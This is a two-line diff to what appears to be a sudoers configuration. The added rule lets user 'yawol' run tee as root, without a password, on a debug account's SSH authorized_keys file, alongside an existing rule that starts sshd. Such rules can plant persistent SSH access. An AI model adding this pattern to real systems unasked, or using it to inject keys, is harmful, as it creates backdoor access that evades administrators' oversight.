@@ -1,1 +1,2 @@
 yawol ALL = NOPASSWD: /sbin/rc-service sshd start
+yawol ALL = NOPASSWD: /usr/bin/tee /home/yawoldebug/.ssh/authorized_keys
